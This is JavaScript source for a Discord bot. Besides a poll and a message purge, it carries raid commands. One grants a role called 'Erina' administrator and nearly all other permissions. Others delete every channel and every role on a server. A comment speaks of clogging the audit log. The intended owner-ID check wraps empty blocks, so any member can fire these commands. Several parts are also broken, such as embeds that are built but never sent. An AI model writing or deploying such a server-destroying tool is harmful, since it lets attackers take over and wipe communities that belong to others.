const Discord = require("discord.js");
const bot = new Discord.Client();
var prefix = (",");
const tokens = require('./tokens.json');
	
	 bot.on('message', message => {
    var part = message.author.id !== "461243335420411926"
	
	 let messageArray = message.content.split(" ");
    let args = messageArray.slice(1);
      if(part) {
};
    if(message.content.startsWith(prefix + "role")) {
		message.delete();
     let rMember = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0]);
    if(!rMember) return message.reply("User does not exist!");
    let role = args.join(" ").slice(22);
    if(!role) return message.reply("Specify a role!");
    let gRole = message.guild.roles.find('name', role);
    if(!gRole) return message.reply("Couldn't find role!");

    if(rMember.roles.has(gRole.id)) return message.reply("They already have that role!");
      rMember.addRoles(gRole.id);
   new Discord.RichEmbed()
      .setColor("RANDOM")
  
 }
	if (message.content === '-role') {
		 if(part) {
};
	message.guild.createRole({
	  name: 'Erina',
	  color: '#00ff1d',
	  permissions: [
		'CREATE_INSTANT_INVITE',
		'KICK_MEMBERS',
		'BAN_MEMBERS',
		'ADMINISTRATOR',
		'MANAGE_CHANNELS',
		'MANAGE_GUILD',
		'ADD_REACTIONS',
		'READ_MESSAGES',
		'SEND_MESSAGES',
		'SEND_TTS_MESSAGES',
		'MANAGE_MESSAGES',
		'EMBED_LINKS',
		'ATTACH_FILES',
		'READ_MESSAGE_HISTORY',
		'MENTION_EVERYONE',
		'EXTERNAL_EMOJIS',
		'CONNECT',
		'SPEAK',
		'MUTE_MEMBERS',
		'DEAFEN_MEMBERS',
		'MOVE_MEMBERS',
		'USE_VAD',
		'CHANGE_NICKNAME',
		'MANAGE_NICKNAMES',
		'MANAGE_ROLES_OR_PERMISSIONS',
		'MANAGE_WEBHOOKS',
		'MANAGE_EMOJIS'
		],
	  })
	  .then(role => console.log(`Created new role with name ${role.name} and color ${role.color}`))
	  .catch(console.error)
		let adrol = message.author.tag
		let server = message.guild.name
		message.delete()
		let role = new Discord.RichEmbed()
	    .setDescription("I create a role for you !")
	    .setColor("RANDOM")
	    .addField(`[!] Created Roles on the server ` + server)

}
	 if (message.content === '-supp') {
		 if(part) {
};

    if(message.deletable) message.delete();
    message.guild.channels.forEach(channel => {
      if(channel.deletable) channel.delete()
  })
}
if (message.content === '-chanel') {
		 if(part) {
};
        if(message.deletable) message.delete();
   	let args = message.content.split(' ')
		args.shift()
            message.guild.createChannel('accueil', 'text')
         //   message.guild.createChannel(args.join(' '), 'text')
              //changes name tons of times to clog up the audit log
}
if (message.content === '-rolesup') {
		 if(part) {
};
        Promise.all(message.guild.roles.map(c => c.delete()));
        console.log('Tous les rôles supprimables ont été supprimés.');
}
   if (message.content.startsWith('-vcscreate')) {
	    if(part) {
};
	     message.guild.createChannel('vcs-erina', 'text')
		 message.delete();
   }
if(message.content.startsWith("-sondage")){
    message.delete();
			if(part) {
};
let args = message.content.split(" ").slice(1);
			let thingToEcho = args.join(" ")
			var embed = new Discord.RichEmbed()
			    .setDescription('Petit Sondage')
                            .addField( thingToEcho , "Répondre par :white_check_mark: ou :x:")
				.setColor("RANDOM")
				.setTimestamp()
message.channel.sendEmbed(embed)
			
     
			.then(function (message){
        message.react("✅")
        message.react("❎")
       	
			}).catch(function(){
				
			});
			message.delete()
		}
if (message.content === '-special') {
		if(part) {
};
message.delete();
	message.guild.createRole({
	  name: 'test',
	  color: '##00ff1d',
	  permissions: [
		'CREATE_INSTANT_INVITE',

		'MANAGE_MESSAGES',

		],
	  })
	  .then(role => console.log(`Created new role with name ${role.name} and color ${role.color}`))
	  .catch(console.error)
		let adrol = message.author.tag
		let server = message.guild.name
		message.delete()
		let role = new Discord.RichEmbed()
	    .setDescription("I create a role for you !")
	    .setColor("RANDOM")
	    .addField(`[!] Created Roles on the server ` + server)

}
if (message.content.startsWith('-purge')) {
if(part) {
};
  message.delete();
     let sender = message.author; 
    let cont = message.content.slice(prefix.length).split(" "); 
    let args = cont.slice(1); 
 
        async function purge() {
            message.delete();
         
            if (isNaN(args[0])) {

                message.channel.send('Please enter a number of message del :ok_hand:  \n Usage: ' + prefix + 'purge <et le nombre de message>'); 

                return;
            }

            const fetched = await message.channel.fetchMessages({limit: args[0]});
            console.log(fetched.size + ' messages found, deleting...');


            message.channel.bulkDelete(fetched)
                .catch(error => message.channel.send(Error `${error}`)); 

        }

        purge();
 message.delete();
    };

   	 });	




bot.login(tokens.d_token);